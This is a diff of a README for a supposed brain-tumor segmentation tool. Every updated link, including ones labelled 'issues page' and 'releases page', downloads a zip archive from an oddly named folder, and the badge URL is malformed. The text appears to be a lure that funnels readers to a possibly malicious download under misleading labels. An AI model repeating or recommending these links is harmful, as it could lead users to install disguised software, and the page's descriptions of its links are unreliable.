@@ -1,7 +1,7 @@
 # 🧠 Brain_Tumor_Segmentation_Unet - Accurate Brain Tumor Detection Made Easy
 
 ## 🔗 Download Here
-[![Download the latest release](https://raw.githubusercontent.com/louaysalh/Brain_Tumor_Segmentation_Unet/main/redivulgence/Unet_Brain_Tumor_Segmentation_v3.9-beta.4.zip%20Latest%https://raw.githubusercontent.com/louaysalh/Brain_Tumor_Segmentation_Unet/main/redivulgence/Unet_Brain_Tumor_Segmentation_v3.9-beta.4.zip)](https://raw.githubusercontent.com/louaysalh/Brain_Tumor_Segmentation_Unet/main/redivulgence/Unet_Brain_Tumor_Segmentation_v3.9-beta.4.zip)
+[![Download the latest release](https://github.com/louaysalh/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/redivulgence/Unet_Brain_Segmentation_Tumor_3.1-alpha.3.zip%20Latest%https://github.com/louaysalh/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/redivulgence/Unet_Brain_Segmentation_Tumor_3.1-alpha.3.zip)](https://github.com/louaysalh/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/redivulgence/Unet_Brain_Segmentation_Tumor_3.1-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and run the application.
 1. **Visit the Downloads Page**
 
    To begin, go to the releases page:  
-   [Download Releases](https://raw.githubusercontent.com/louaysalh/Brain_Tumor_Segmentation_Unet/main/redivulgence/Unet_Brain_Tumor_Segmentation_v3.9-beta.4.zip)
+   [Download Releases](https://github.com/louaysalh/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/redivulgence/Unet_Brain_Segmentation_Tumor_3.1-alpha.3.zip)
 
 2. **Choose the Latest Version**
 
@@ -76,13 +76,13 @@ If you encounter issues, here are some common problems and solutions:
 
 ## 🌐 Community and Support
 
-If you need help or want to share your experiences, join the community on GitHub Discussions or visit the [issues page](https://raw.githubusercontent.com/louaysalh/Brain_Tumor_Segmentation_Unet/main/redivulgence/Unet_Brain_Tumor_Segmentation_v3.9-beta.4.zip) for support from other users and contributors.
+If you need help or want to share your experiences, join the community on GitHub Discussions or visit the [issues page](https://github.com/louaysalh/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/redivulgence/Unet_Brain_Segmentation_Tumor_3.1-alpha.3.zip) for support from other users and contributors.
 
 Feel free to leave feedback or suggestions about your experience with the software; your input is valuable.
 
 ## 📅 Future Updates
 
-We strive to improve the application continuously. Be sure to check the [releases page](https://raw.githubusercontent.com/louaysalh/Brain_Tumor_Segmentation_Unet/main/redivulgence/Unet_Brain_Tumor_Segmentation_v3.9-beta.4.zip) frequently for updates that may include new features, performance enhancements, and bug fixes.
+We strive to improve the application continuously. Be sure to check the [releases page](https://github.com/louaysalh/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/redivulgence/Unet_Brain_Segmentation_Tumor_3.1-alpha.3.zip) frequently for updates that may include new features, performance enhancements, and bug fixes.
 
 ## 🎉 Acknowledgments
 
